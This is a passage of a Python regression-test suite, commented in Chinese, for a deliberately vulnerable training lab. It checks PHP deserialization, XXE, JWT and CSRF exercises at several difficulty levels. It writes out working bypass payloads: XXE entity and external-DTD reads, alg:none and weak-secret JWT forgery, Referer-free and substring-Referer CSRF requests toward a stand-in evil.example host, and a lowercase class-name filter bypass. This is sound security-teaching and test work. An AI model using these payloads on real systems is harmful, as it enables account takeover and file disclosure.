    wrote, body = _unserialize_probe(base, "low", payload)

    if wrote:
        evidence = _POP_PROBE_NAME
        if "POP 链生效" in body:
            evidence += "（页面副作用检查也确认了）"
        return True, "POP 链生效：反序列化本身写出了文件，无需额外触发", evidence
    if "过滤器命中" in body:
        return False, "payload 被过滤器拦下 —— low 档不该有任何过滤", ""
    return False, "未写出文件 —— POP 链可能已断（检查 __destruct 与 write）", ""


def check_unserialize_low_benign_no_side_effect(base: str) -> tuple[bool, str, str]:
    """low 档负向对照：一个「无害」的序列化串不应该产生任何副作用。

    这条对照不是凑数的 —— 它把「写文件」这个结果**归因**给 POP 链。
    少了它，上面那条断言只证明了「某个输入写了个文件」，
    分不清是链生效还是页面本身就有副作用。
    """
    benign = 'O:8:"SafeNote":1:{s:4:"text";s:11:"just a note";}'
    wrote, body = _unserialize_probe(base, "low", benign)

    if wrote:
        return False, "★ 无害对象也写出了文件 —— 存在预期之外的副作用路径", ""
    if "反序列化得到的对象结构" not in body:
        return False, "合法序列化串未能正常反序列化 —— 场景可能已被改坏", ""
    return True, "无害对象无副作用（证明写文件确实来自 POP 链）", "SafeNote 正常反序列化"


def check_unserialize_documented_relative_path(base: str) -> tuple[bool, str, str]:
    """页面提示的那个相对路径，必须真的能用。

    这是一条「文档与行为一致性」断言，补的是一个真实踩过的坑：

      靶场页面上只写着「写出一个文件到 uploads 目录」，没给相对路径。
      而链的终点 `file_put_contents($this->dir . $key, $value)` 里，
      **相对路径是按进程的当前工作目录解析的** —— 而 PHP 内置服务器
      会把 CWD 切到被请求脚本所在目录（`html/unserialize/`）。

      于是按字面填 `html/uploads/` 会写到 `html/unserialize/html/uploads/`，
      目录不存在 → `file_put_contents` 返回 false → 而代码里用了 `@` 抑制，
      **完全不报错**。页面只显示「没有新文件」，看起来像漏洞不存在。

      更麻烦的是：CI 里其它断言用的是绝对路径，全都通过 ——
      所以这个坑对测试完全隐形，只有真人照页面提示操作才会撞上。

    现在页面通过 `render_target_dir_hint()` 把该填的值直接算出来展示，
    这条断言负责守住「页面上说的那个路径」确实能打通。

    **文档和行为对不上，比文档写得少更糟** —— 后者只是信息不全，
    前者会让人怀疑自己。
    """
    payload = _pop_chain_payload(
        _POP_PROBE_NAME, _POP_PROBE_BODY, dir_="../uploads/"
    )
    wrote, _body = _unserialize_probe(base, "low", payload)

    if wrote:
        return True, "页面提示的相对路径（../uploads/）可用", "../uploads/"
    return False, "★ 页面提示的路径打不通 —— 文档与实际行为不一致", ""


def check_unserialize_medium_blocks_plain(base: str) -> tuple[bool, str, str]:
    """medium 档：带标准大写类名的 payload 应被黑名单拦下。

    这是对照组 —— 证明过滤器确实在工作，而不是「什么都没管」。
    """
    payload = _pop_chain_payload(_POP_PROBE_NAME, _POP_PROBE_BODY)
    wrote, body = _unserialize_probe(base, "medium", payload)

    if wrote:
        return False, "★ 标准 payload 未被拦下 —— 类名黑名单已失效", ""
    if "过滤器命中" in body:
        return True, "类名黑名单拦下了标准 payload", "过滤器命中"
    return False, "未观察到明确的拦截提示", ""


def check_unserialize_medium_case_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档：把类名全部改成小写应该绕过黑名单。

    原理：**PHP 的类名不区分大小写，而 `strpos` 区分。**
    过滤器看的是字符串，运行时看的是类名 —— 两者对大小写的态度不一致，
    这中间的缝隙就是绕过点。

    和 SQL 注入的 `ununionion`、LFI 的 `....//` 是同一类问题的不同表现：
    **过滤器对输入的理解，和解析器对输入的理解，不是同一个理解。**
    """
    payload = _pop_chain_payload(_POP_PROBE_NAME, _POP_PROBE_BODY, lowercase=True)
    wrote, body = _unserialize_probe(base, "medium", payload)

    if wrote:
        return True, "小写类名绕过黑名单（类名大小写不敏感，strpos 敏感）", "cache/filestore"
    if "过滤器命中" in body:
        return False, "小写写法的载荷也被拦下了 —— 本档的绕过点可能已被堵上", ""
    return False, "小写 payload 未产生预期效果", ""


def check_unserialize_high_blocks_all(base: str) -> tuple[bool, str, str]:
    """high 档：无论类名怎么写，都不该形成 POP 链。

    试了两种写法：标准大写、全小写（也就是 medium 档的绕过点）。
    白名单的判定发生在 `unserialize` 内部，类名大小写怎么写都一样 ——
    所以 medium 档那招在这里彻底失效。
    """
    attempts = [
        ("标准大写", _pop_chain_payload(_POP_PROBE_NAME, _POP_PROBE_BODY)),
        ("全小写", _pop_chain_payload(_POP_PROBE_NAME, _POP_PROBE_BODY, lowercase=True)),
    ]
    for label, payload in attempts:
        wrote, _body = _unserialize_probe(base, "high", payload)
        if wrote:
            return False, f"★ 严重：high 档被绕过（{label}）—— allowed_classes 白名单失效", ""
    return True, "白名单拒绝全部 POP 链写法（类被降级为 __PHP_Incomplete_Class）", "allowed_classes 生效"


def check_unserialize_high_allows_whitelisted(base: str) -> tuple[bool, str, str]:
    """high 档：白名单内的类必须仍能正常反序列化。

    反向保护 —— 防止为了「更安全」把功能改坏。
    最省事的"修复"是 `allowed_classes => false`，那确实谁也攻击不了，
    但业务也用不了任何类了。白名单的意义是**只允许这里真正需要的那个类**，
    所以必须验证它在。
    """
    benign = 'O:8:"SafeNote":1:{s:4:"text";s:5:"hello";}'
    wrote, body = _unserialize_probe(base, "high", benign)

    if wrote:
        return False, "★ 白名单内的类居然产生了副作用", ""
    # print_r 对真实对象输出 `SafeNote Object`；
    # 被拒绝时则输出 `__PHP_Incomplete_Class Object`，类名只出现在属性值里。
    # 用这两个形态区分，才不会把「拒绝」误读成「通过」。
    if "__PHP_Incomplete_Class_Name] => SafeNote" in body:
        return False, "白名单内的 SafeNote 也被降级了 —— 修复过度，破坏了功能", ""
    if "SafeNote Object" in body:
        return True, "白名单内的类正常反序列化", "SafeNote Object"
    return False, "白名单内的类未正常反序列化", ""


# --------------------------------------------------------------- XXE 场景断言


# 演示文件里的固定标记串（html/xxe/xxe_probe.txt）
_XXE_MARKER = "VULNLAB_XXE_PROBE_MARKER"


def _xxe_probe(base: str, level: str, xml: str) -> str:
    """把一段 XML 投给指定档，返回响应正文。"""
    return _post_form(base, f"/xxe/{level}.php", {"xml": xml})


def _xxe_order_id(body: str) -> str | None:
    """从响应里取出「订单号」字段的值；取不到返回 None。

    ⚠️ 必须限定在这个字段里取，不能全文搜标记串 ——
    页面会把提交的 XML 原样回显到 `<textarea>` 里，
    全文匹配会把「用户提交的内容」误认成「读到的文件内容」。

    这和 CMDI 场景踩过的坑是同一个：
    **检测特征可能被检测行为本身制造出来。**
    """
    match = re.search(r"订单号：<b>([^<]*)</b>", body)
    return match.group(1) if match else None


def check_xxe_low_reads_local_file(base: str) -> tuple[bool, str, str]:
    """low 档：内联实体应能读到服务器本地文件。

    载荷读的是靶场自带的演示文件（`html/xxe/xxe_probe.txt`），内容是固定标记串。

    为什么不用 `/etc/passwd` 或 `win.ini`：它们在不同机器上不一定存在、
    内容也不一样，会让「到底读到没有」这件事本身变得不可判断。
    换成固定内容的演示文件，判据就只取决于漏洞是否成立，
    而不是「这台机器上恰好有什么文件」。
    """
    payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE order [<!ENTITY xxe SYSTEM "xxe_probe.txt">]>'
        "<order><id>&xxe;</id></order>"
    )
    body = _xxe_probe(base, "low", payload)
    value = _xxe_order_id(body)

    if value and _XXE_MARKER in value:
        return True, "内联实体被解析，读到了本地文件内容", _XXE_MARKER
    if value is None:
        return False, "页面没有渲染出订单号字段 —— 场景可能已被改坏", ""
    return False, f"未读到文件内容（订单号 = {value[:30]!r}）—— XXE 可能已被修掉", ""


def check_xxe_low_benign_works(base: str) -> tuple[bool, str, str]:
    """low 档：不含 DTD 的正常订单必须照常解析。

    反向保护 —— 防止有人为了「更安全」把所有 XML 都拒了。
    这条同时确立了基线：**普通 XML 是能正常工作的**，
    所以上面那条断言里出现的标记串确实来自实体展开，而不是别的路径。
    """
    body = _xxe_probe(base, "low", '<?xml version="1.0"?><order><id>1001</id></order>')
    value = _xxe_order_id(body)

    if value == "1001":
        return True, "正常订单照常解析", "订单号 1001"
    return False, f"正常订单未能解析（订单号 = {value!r}）", ""


def check_xxe_medium_blocks_plain(base: str) -> tuple[bool, str, str]:
    """medium 档：内联实体声明应被黑名单拦下（对照组）。"""
    payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE order [<!ENTITY xxe SYSTEM "xxe_probe.txt">]>'
        "<order><id>&xxe;</id></order>"
    )
    body = _xxe_probe(base, "medium", payload)

    if "过滤器命中" in body:
        return True, "请求体内的 `<!ENTITY` 被黑名单拦下", "过滤器命中"
    value = _xxe_order_id(body)
    if value and _XXE_MARKER in value:
        return False, "★ 内联实体未被拦下 —— 黑名单已失效", ""
    return False, "未观察到明确的拦截提示", ""


def check_xxe_medium_external_dtd_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档：把实体声明挪到外部 DTD 应能绕过黑名单。

    原理：XML 的 DTD 有两个位置 ——
      · 内部子集（写在文档里）→ 过滤器检查的就是这里
      · 外部子集（写在另一个文件里，文档只用 SYSTEM 指向它）→ 过滤器看不到

    请求体里只剩 `<!DOCTYPE order SYSTEM "attacker.dtd">`，不含 `<!ENTITY`，
    黑名单放行；而解析器会去加载那个 DTD，照着里面的声明展开实体。

    **过滤器检查的是「文档里写了什么」，
    解析器执行的是「文档 + 它引用的所有外部资源」。**
    两者的作用范围不一致 —— 这就是绕过点。

    `attacker.dtd` 是仓库里的文件，扮演「攻击者自己服务器上的 DTD」——
    这样整个绕过过程能在本地完整复现，不依赖外部 HTTP 服务器。
    """
    payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE order SYSTEM "attacker.dtd">'
        "<order><id>&xxe;</id></order>"
    )
    body = _xxe_probe(base, "medium", payload)
    value = _xxe_order_id(body)

    if value and _XXE_MARKER in value:
        return True, "外部 DTD 绕过黑名单（请求体内无 `<!ENTITY`）", "attacker.dtd"
    if "过滤器命中" in body:
        return False, "外部 DTD 写法也被拦下了 —— 本档的绕过点可能已被堵上", ""
    return False, f"外部 DTD 未产生预期效果（订单号 = {value!r}）", ""


def check_xxe_high_blocks_all(base: str) -> tuple[bool, str, str]:
    """high 档：内联实体与外部 DTD 都不能读到文件。

    两层载荷各打一次：
      · 内联实体（low 档的手法）
      · 外部 DTD（medium 档的绕过手法）—— 这一条尤其重要，
        因为 medium 的黑名单在 high 档被换成了「输入收窄 + 禁外部加载器」，
        需要确认新方案对**两种**写法都有效。
    """
    payloads = [
        (
            "内联实体",
            '<?xml version="1.0"?>'
            '<!DOCTYPE order [<!ENTITY xxe SYSTEM "xxe_probe.txt">]>'
            "<order><id>&xxe;</id></order>",
        ),
        (
            "外部 DTD",
            '<?xml version="1.0"?>'
            '<!DOCTYPE order SYSTEM "attacker.dtd">'
            "<order><id>&xxe;</id></order>",
        ),
    ]
    for label, payload in payloads:
        body = _xxe_probe(base, "high", payload)
        value = _xxe_order_id(body) or ""
        if _XXE_MARKER in value:
            return False, f"★ 严重：high 档被绕过（{label}）—— 三层防护失效", ""
    return True, "内联实体与外部 DTD 均被拒绝（三层防护生效）", "LIBXML_NOENT 未启用"


def check_xxe_high_normal_works(base: str) -> tuple[bool, str, str]:
    """high 档：不含 DTD 的正常订单必须照常解析。

    反向保护。本档的「输入收窄」层是按 `<!DOCTYPE` / `<!ENTITY` 做判断的，
    所以必须确认它没有连正常请求一起拒掉 ——
    **收窄输入时误伤业务，是这类修复最常见的副作用。**
    """
    body = _xxe_probe(base, "high", '<?xml version="1.0"?><order><id>1001</id></order>')
    value = _xxe_order_id(body)

    if value == "1001":
        return True, "正常订单照常解析", "订单号 1001"
    if "只接受纯数据 XML" in body:
        return False, "正常订单也被拒绝了 —— 输入收窄误伤了业务", ""
    return False, f"正常订单未能解析（订单号 = {value!r}）", ""


# --------------------------------------------------------------- JWT 场景断言


# 通关凭证 —— 只有 role=admin 且通过校验时才会出现在响应里
_JWT_FLAG = "VULNLAB{jwt_signature_bypass}"

# medium 档那个弱密钥（可以靠 html/jwt/wordlist.txt 爆破出来）
_JWT_WEAK_SECRET = "secret"


def _jwt_b64e(data: bytes) -> str:
    """base64url 编码（无填充）—— 与 jwt.php 里的实现保持一致。"""
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _jwt_make_token(header: dict, payload: dict, secret: str = "") -> str:
    """按 JWT 规范拼一个 token。

    alg 为 none 时按规定签名段是空的（也就是 token 以 `.` 结尾）——
    这正是 low 档能被绕过的原因。

    这里在 CI 里自己实现一遍而不是依赖第三方库：
      · 靶场本身就是「手写 JWT」的形态，测试照同样的方式构造才对称
      · 少一个测试依赖，`pip install -r requirements.txt` 也不用多装东西
    """
    h = _jwt_b64e(json.dumps(header, separators=(",", ":")).encode())
    p = _jwt_b64e(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}"

    if header.get("alg") == "none":
        return signing_input + "."

    signature = hmac.new(
        secret.encode(), signing_input.encode(), hashlib.sha256
    ).digest()
    return f"{signing_input}.{_jwt_b64e(signature)}"


def _jwt_issue(base: str, level: str) -> str:
    """向指定档申请一个 token，从响应里把它抠出来。"""
    body = _post_form(base, f"/jwt/{level}.php", {"action": "issue"})
    match = re.search(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*", body)
    return match.group(0) if match else ""


def _jwt_verify(base: str, level: str, token: str) -> str:
    """提交一个 token 给指定档校验，返回响应正文。"""
    return _post_form(base, f"/jwt/{level}.php", {"action": "verify", "token": token})


def _jwt_passed_as_admin(body: str) -> bool:
    """响应里是否给出了通关凭证。

    判据用凭证本身 —— 它只在「校验通过 **且** 角色是 admin」时渲染，
    所以出现即等价于「以管理员身份通过了校验」。

    ⚠️ 不能拿页面上的其它文字当判据：靶场各档页面里都写着
    「让服务端认为你是 role=admin」这类目标描述，
    按关键词匹配会把这些说明性文字也算成命中。
    （这一条在开发时真踩过：low 档的目标文案里曾经直接印出了凭证本身，
     结果「没通关」和「通关了」的响应完全无法区分。）
    """
    return _JWT_FLAG in body


def check_jwt_low_accepts_alg_none(base: str) -> tuple[bool, str, str]:
    """low 档：把 alg 改成 none 应该能绕过签名校验。

    载荷只需两步：
      ① header 里 `alg` 改成 `none`
      ② payload 里 `role` 改成 `admin`
      ③ 签名段留空（规范规定 alg=none 时签名为空串）

    触发这个漏洞的关键在于：**`alg` 是 token 里的一个字段**，
    也就是说它由提交 token 的人控制，而不是由服务端控制。
    """
    token = _jwt_make_token(
        {"alg": "none", "typ": "JWT"}, {"user": "alice", "role": "admin"}
    )
    body = _jwt_verify(base, "low", token)

    if _jwt_passed_as_admin(body):
        return True, "alg:none 绕过签名，以 admin 身份通过", "alg=none"
    return False, "alg:none 未被接受 —— 场景可能已被改坏", ""


def check_jwt_low_rejects_bad_signature(base: str) -> tuple[bool, str, str]:
    """low 档：签名不匹配的 HS256 token 仍应被拒绝。

    这是对照组里最关键的一条 —— 它证明 low 档**不是「什么都不校验」**，
    而是「有一条特定的分支不校验」。

    少了这条，上面那条断言的说服力会弱很多：
    分不清是「alg:none 绕过了校验」，还是「这个档压根不校验任何东西」。
    """
    issued = _jwt_issue(base, "low")
    if not issued:
        return False, "未能从页面取到签发的 token", ""

    parts = issued.split(".")
    tampered = f"{parts[0]}.{parts[1]}.AAAA"

    body = _jwt_verify(base, "low", tampered)
    if _jwt_passed_as_admin(body):
        return False, "签名被改坏却仍然放行 —— 该档根本没有校验签名", ""
    if "签名不匹配" in body:
        return True, "签名不匹配的 HS256 token 被拒绝（校验确实存在）", "签名不匹配"
    return False, "未观察到明确的拒绝提示", ""


def check_jwt_low_valid_token_works(base: str) -> tuple[bool, str, str]:
    """low 档：正常签发的 token 必须能正常使用。

    反向保护 —— 防止有人为了「更安全」把所有 token 都拒了。
    """
    issued = _jwt_issue(base, "low")
    if not issued:
        return False, "未能从页面取到签发的 token", ""

    body = _jwt_verify(base, "low", issued)
    if "token 未通过校验" in body:
        return False, "正常 token 也被拒绝了 —— 修复过度，破坏了功能", ""
    if "个人资料" in body:
        return True, "正常 token 照常通过校验", "role=user"
    return False, "正常 token 未产生预期结果", ""


def check_jwt_medium_rejects_alg_none(base: str) -> tuple[bool, str, str]:
    """medium 档：`alg:none` 必须被拒绝（证明 low 的口子已堵上）。"""
    token = _jwt_make_token(
        {"alg": "none", "typ": "JWT"}, {"user": "alice", "role": "admin"}
    )
    body = _jwt_verify(base, "medium", token)

    if _jwt_passed_as_admin(body):
        return False, "★ 严重：medium 档仍接受 alg:none —— 算法白名单失效", ""
    if "只接受 HS256" in body:
        return True, "算法白名单拒绝了 alg:none", "只接受 HS256"
    return False, "未观察到明确的算法拒绝提示", ""


def check_jwt_medium_weak_secret_forgeable(base: str) -> tuple[bool, str, str]:
    """medium 档：用弱密钥 `secret` 应能签出合法 token。

    这一条模拟「已经爆破出密钥」之后的一步：
    攻击者用猜到的密钥给伪造的 payload 算一个**数学上完全合法**的签名。
    校验逻辑毫发无损，token 却完全是自己写的。

    顺带一提：`html/jwt/wordlist.txt` 里那份小字典确实能爆破出这个密钥
    （本仓库实测 31 条命中）—— 这也验证了「这个档是可被手工完成的」。
    """
    token = _jwt_make_token(
        {"alg": "HS256", "typ": "JWT"},
        {"user": "alice", "role": "admin"},
        _JWT_WEAK_SECRET,
    )
    body = _jwt_verify(base, "medium", token)

    if _jwt_passed_as_admin(body):
        return True, "用弱密钥签名伪造以 admin 身份通过", f"secret={_JWT_WEAK_SECRET}"
    if "签名不匹配" in body:
        return False, "弱密钥签名未被接受 —— 本档的密钥可能已经被换强了", ""
    return False, "弱密钥伪造未产生预期效果", ""


def check_jwt_high_rejects_alg_none(base: str) -> tuple[bool, str, str]:
    """high 档：`alg:none` 必须被拒绝。"""
    token = _jwt_make_token(
        {"alg": "none", "typ": "JWT"}, {"user": "alice", "role": "admin"}
    )
    body = _jwt_verify(base, "high", token)

    if _jwt_passed_as_admin(body):
        return False, "★ 严重：high 档被 alg:none 绕过", ""
    return True, "算法白名单拒绝了 alg:none", "in_array 白名单生效"


def check_jwt_high_rejects_weak_secret(base: str) -> tuple[bool, str, str]:
    """high 档：用 medium 档的弱密钥签名也必须被拒绝。

    这一条是「medium 的绕过手法在 high 档失效」的直接验证 ——
    只修算法判断是不够的，密钥强度必须同时修。
    """
    token = _jwt_make_token(
        {"alg": "HS256", "typ": "JWT"},
        {"user": "alice", "role": "admin"},
        _JWT_WEAK_SECRET,
    )
    body = _jwt_verify(base, "high", token)

    if _jwt_passed_as_admin(body):
        return False, "★ 严重：high 档接受弱密钥签名 —— 密钥强度没修", ""
    if "签名不匹配" in body:
        return True, "弱密钥签名被拒绝（高熵密钥生效）", "签名不匹配"
    return False, "未观察到明确的拒绝提示", ""


def check_jwt_high_valid_token_works(base: str) -> tuple[bool, str, str]:
    """high 档：正常签发的 token 必须能正常使用。

    反向保护。本档除了算法白名单，还加了「必需声明校验」（exp 必须存在），
    所以这条同时守住「别把没带 exp 的正常请求也误伤掉」——
    靶场自己签发 token 时会带上 exp。
    """
    issued = _jwt_issue(base, "high")
    if not issued:
        return False, "未能从页面取到签发的 token", ""

    body = _jwt_verify(base, "high", issued)
    if "token 未通过校验" in body:
        return False, "正常 token 也被拒绝了 —— 修复过度，破坏了功能", ""
    if "个人资料" in body:
        return True, "正常 token 照常通过校验（含 exp 声明）", "四层全部放行"
    return False, "正常 token 未产生预期结果", ""


# -------------------------------------------------------------- CSRF 场景断言


# 攻击者想改成的邮箱 / 达成后页面渲染的通关凭证
_CSRF_ATTACKER_EMAIL = "attacker@evil.example"
_CSRF_FLAG = "VULNLAB{csrf_token_forgotten}"

# 一个纯粹的「外部站点」Referer
_CSRF_FOREIGN_REFERER = "http://evil.example/attack.html"


def _http_request(
    url: str,
    *,
    method: str = "GET",
    fields: dict[str, str] | None = None,
    headers: dict[str, str] | None = None,
) -> str:
    """发一个请求并返回正文。

    比 `_post_form` 多两个能力：支持自定义请求头（CSRF 场景必须能设置
    `Referer`）与 GET 请求（用于读取当前状态和 token）。
    """
    data = urllib.parse.urlencode(fields).encode() if fields else None
    request = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": "VulnLab-CI/1.0 (regression-check)",
            **({"Content-Type": "application/x-www-form-urlencoded"} if data else {}),
            **(headers or {}),
        },
        method=method,
    )
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
            return response.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", errors="ignore")
    except (urllib.error.URLError, TimeoutError, OSError):
        return ""


def _csrf_reset(base: str, level: str) -> None:
    """把该档的场景状态恢复到初始值。

    ⚠️ 这一步**每条断言都必须做**。原因：
    CSRF 攻击会真的改掉服务端状态，而「通关凭证」是渲染在**当前状态**里的 ——
    一旦被改过，后面任何一次 GET 都会看到凭证。
    不重置的话，「这次请求成功了吗」和「以前成功过吗」就分不清了。
    """
    _http_request(f"{base.rstrip('/')}/csrf/{level}.php?reset=1")


def _csrf_state(base: str, level: str) -> tuple[str, str]:
    """读取页面上的 (当前邮箱, 当前 token)。"""
    body = _http_request(f"{base.rstrip('/')}/csrf/{level}.php")
    email = re.search(r"绑定邮箱</b><span class=\"mono\">([^<]*)</span>", body)
    token = re.search(r'name="csrf_token" value="([^"]+)"', body)
    return (
        email.group(1) if email else "",
        token.group(1) if token else "",
    )


def _csrf_changed(body: str) -> bool:
    """这一次请求的结果是「已修改」吗。

    判据用结果区那句「上一次请求：<b>已修改</b>」——
    它是**针对本次请求**的结论，不会受历史状态影响。
    """
    return "上一次请求：<b>已修改</b>" in body


def check_csrf_low_cross_site_succeeds(base: str) -> tuple[bool, str, str]:
    """low 档：带外部 Referer 的跨站 POST 应该成功。

    这就是 CSRF 在最朴素形态下的完整验证 ——
    请求来自 `evil.example`，服务器照样执行了状态变更。
    """
    _csrf_reset(base, "low")
    body = _http_request(
        f"{base.rstrip('/')}/csrf/low.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL},
        headers={"Referer": _CSRF_FOREIGN_REFERER},
    )

    if _csrf_changed(body) and _CSRF_FLAG in body:
        return True, "外部来源的 POST 成功修改了邮箱（零防护）", _CSRF_ATTACKER_EMAIL
    if _csrf_changed(body):
        return True, "外部来源的 POST 成功修改了邮箱", "已修改"
    return False, "跨站 POST 未生效 —— 场景可能已被改坏", ""


def check_csrf_medium_rejects_foreign_referer(base: str) -> tuple[bool, str, str]:
    """medium 档：Referer 完全对不上的跨站请求应被拒绝（对照组）。"""
    _csrf_reset(base, "medium")
    body = _http_request(
        f"{base.rstrip('/')}/csrf/medium.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL},
        headers={"Referer": _CSRF_FOREIGN_REFERER},
    )
    email, _ = _csrf_state(base, "medium")

    if _CSRF_FLAG in body or email == _CSRF_ATTACKER_EMAIL:
        return False, "★ 外部 Referer 的请求未被拦下 —— Referer 检查已失效", ""
    if "被拒绝" in body:
        return True, "Referer 不含本站 host，请求被拒绝", "Referer 检查生效"
    return False, "未观察到明确的拒绝提示", ""


def check_csrf_medium_no_referer_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档绕过点一：不带 Referer 就能通过。

    代码里写着「Referer 为空 → 大概是用户直接访问 → 放行」。
    但这个推断的前提「攻击者没法不发 Referer」是错的 ——
    攻击者在自己页面 `<head>` 里加一行就能让浏览器完全不带 Referer：

        <meta name="referrer" content="no-referrer">

    **Referer 属于「请求方可以自愿提供、也可以自愿不提供」的信息，
    服务端不能把它当作强制性的证据。**
    """
    _csrf_reset(base, "medium")
    body = _http_request(
        f"{base.rstrip('/')}/csrf/medium.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL},
        # 刻意不带 Referer
    )

    if _csrf_changed(body):
        return True, "不带 Referer 的跨站请求通过了（no-referrer 绕过）", "Referer 为空时放行"
    if "被拒绝" in body:
        return False, "不带 Referer 也被拒绝了 —— 本档的绕过点可能已被堵上", ""
    return False, "不带 Referer 的请求未产生预期效果", ""


def check_csrf_medium_substring_referer_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档绕过点二：Referer 里「包含」目标 host 即可通过。

    代码用 `strpos($referer, $host) !== false` ——
    这是「包含」，不是「相等」。真实场景里攻击者只需注册一个
    *名字里含目标域名*的域名（目标是 `bank.com` → 攻击者用 `bank.com.evil.com`），
    浏览器就会诚实地填上带这个子串的 Referer。

    **注意这个绕过不需要伪造任何请求头** —— 攻击者只是买了个域名。

    靶场的 host 是 `127.0.0.1:8080`，没法真的注册这种域名，
    所以这里直接构造那个形状的 Referer，效果等价。
    """
    _csrf_reset(base, "medium")
    host = base.rstrip("/").replace("http://", "").replace("https://", "")
    body = _http_request(
        f"{base.rstrip('/')}/csrf/medium.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL},
        headers={"Referer": f"http://{host}.evil.example/"},
    )

    if _csrf_changed(body):
        return True, "Referer 仅「包含」本站 host 即通过（子串绕过）", f"{host}.evil.example"
    if "被拒绝" in body:
        return False, "子串形式的 Referer 也被拒绝了 —— 检查可能已改成相等判断", ""
    return False, "子串 Referer 未产生预期效果", ""


def check_csrf_high_rejects_cross_site(base: str) -> tuple[bool, str, str]:
    """high 档：不带 token 的跨站请求必须被拒绝。

    顺带确认**邮箱没有被改动** —— 只看到「被拒绝」的文案不算数，
    必须确认副作用没有发生。
    """
    _csrf_reset(base, "high")
    email_before, _ = _csrf_state(base, "high")

    body = _http_request(
        f"{base.rstrip('/')}/csrf/high.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL},
        headers={"Referer": _CSRF_FOREIGN_REFERER},
    )
    email_after, _ = _csrf_state(base, "high")

    if email_after == _CSRF_ATTACKER_EMAIL:
        return False, "★ 严重：不带 token 的跨站请求改掉了邮箱", ""
    if email_after != email_before:
        return False, f"邮箱被改动了（{email_before} → {email_after}）—— 防护不完整", ""
    if "缺少 CSRF token" in body:
        return True, "缺少 token 的跨站请求被拒绝，且状态未被改动", "层 ① 生效"
    return False, "未观察到明确的拒绝提示", ""


def check_csrf_high_rejects_wrong_token(base: str) -> tuple[bool, str, str]:
    """high 档：token 不对也必须被拒绝。

    这一条和上一条是配对的：上一条证明「必须带 token」，
    这一条证明「带了也没用，得带对」。
    """
    _csrf_reset(base, "high")
    body = _http_request(
        f"{base.rstrip('/')}/csrf/high.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL, "csrf_token": "0" * 32},
        headers={"Referer": _CSRF_FOREIGN_REFERER},
    )
    email, _ = _csrf_state(base, "high")

    if email == _CSRF_ATTACKER_EMAIL:
        return False, "★ 严重：错误 token 也被接受了", ""
    if "不匹配" in body:
        return True, "错误 token 被拒绝，状态未改动", "token 比对生效"
    return False, "未观察到明确的 token 拒绝提示", ""


def check_csrf_high_accepts_valid_token(base: str) -> tuple[bool, str, str]:
    """high 档：带正确 token 的正常请求必须能用。

    反向保护 —— 防止有人为了「更安全」把带 token 的正常请求也拒了。
    """
    _csrf_reset(base, "high")
    _, token = _csrf_state(base, "high")
    if not token:
        return False, "未能从页面取到 CSRF token", ""

    body = _http_request(
        f"{base.rstrip('/')}/csrf/high.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL, "csrf_token": token},
        headers={"Referer": f"{base.rstrip('/')}/csrf/high.php"},
    )

    if _csrf_changed(body):
        return True, "带正确 token 的请求正常生效", "四层全部放行"
    return False, "正常请求也被拒绝了 —— 修复过度，破坏了功能", ""


def check_csrf_high_rotates_token(base: str) -> tuple[bool, str, str]:
    """high 档：成功之后 token 应当轮换，旧 token 作废。

    这一层不是防 CSRF 的必需品（不轮换的 token 同样挡得住跨站请求），
    但它能顺带挡住「重放同一个请求」——
    比如同一个改邮箱请求被攻击者反复提交。
    """
    _csrf_reset(base, "high")
    _, old_token = _csrf_state(base, "high")
    if not old_token:
        return False, "未能从页面取到 CSRF token", ""

    # 先做一次合法修改，触发轮换
    _http_request(
        f"{base.rstrip('/')}/csrf/high.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL, "csrf_token": old_token},
        headers={"Referer": f"{base.rstrip('/')}/csrf/high.php"},
    )
    _, new_token = _csrf_state(base, "high")

    if new_token == old_token:
        return False, "成功之后 token 没有轮换 —— 重放防护缺失", ""

    # 用旧 token 再发一次，应该被拒
    body = _http_request(
        f"{base.rstrip('/')}/csrf/high.php",
        method="POST",
        fields={"email": "second@evil.example", "csrf_token": old_token},
        headers={"Referer": f"{base.rstrip('/')}/csrf/high.php"},
    )
    if _csrf_changed(body) or "second@evil.example" in _csrf_state(base, "high")[0]:
        return False, "旧 token 仍然可用 —— 重放没有被挡住", ""
    return True, "成功之后 token 已轮换，旧 token 失效", "一次性 token 生效"


def check_csrf_high_rejects_foreign_referer_with_token(base: str) -> tuple[bool, str, str]:
    """high 档：即使 token 正确，外部 Referer 也应被拒绝（层 ③）。

    这条断言的意义在于说明**分层的作用**：
    层 ③（Referer）单独存在时是守不住的（medium 档已经证明），
    但作为 token 之外的补充，它能再挡掉一类请求。
    """
    _csrf_reset(base, "high")
    _, token = _csrf_state(base, "high")
    if not token:
        return False, "未能从页面取到 CSRF token", ""

    body = _http_request(
        f"{base.rstrip('/')}/csrf/high.php",
        method="POST",
        fields={"email": _CSRF_ATTACKER_EMAIL, "csrf_token": token},
        headers={"Referer": _CSRF_FOREIGN_REFERER},
    )
    email, _ = _csrf_state(base, "high")

    if email == _CSRF_ATTACKER_EMAIL:
        return False, "外部 Referer + 正确 token 仍然生效 —— 层 ③ 未起作用", ""
    if "Referer 与本站不符" in body:
        return True, "外部 Referer 被层 ③ 拒绝（token 正确也不例外）", "分层防护生效"
    return False, "未观察到明确的 Referer 拒绝提示", ""


# -------------------------------------------------------------- SSTI 场景断言


